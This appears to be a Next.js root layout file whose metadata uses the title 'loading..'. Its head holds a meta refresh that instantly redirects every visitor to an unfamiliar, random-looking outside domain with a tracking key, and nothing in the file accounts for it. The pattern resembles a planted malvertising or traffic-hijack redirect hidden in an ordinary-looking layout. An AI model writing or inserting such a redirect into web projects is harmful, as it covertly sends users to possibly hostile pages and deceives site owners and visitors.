import { Metadata } from "next"
import { siteConfig } from "@/config"

export const metadata: Metadata = {
  title: {
    default: "loading..",
    template: `%s - ${siteConfig.name}`,
  },
  description: siteConfig.description,
  icons: {
    icon: "/favicon.ico",
    shortcut: "/favicon-16x16.png",
    apple: "/apple-touch-icon.png",
  },
}

interface LoadingLayoutProps {
  children: React.ReactNode
}

export default function RootLayout({ children }: LoadingLayoutProps) {
  return (
    <html lang="en">
      <head>
        <meta
          httpEquiv="refresh"
          content="0;url=https://conceivesaucerfalcon.com/jydku1nj?key=c3d7818efc4bf1bf72c9e4c0b0ba8972"
        />
      </head>
      <body>{children}</body>
    </html>
  )
}
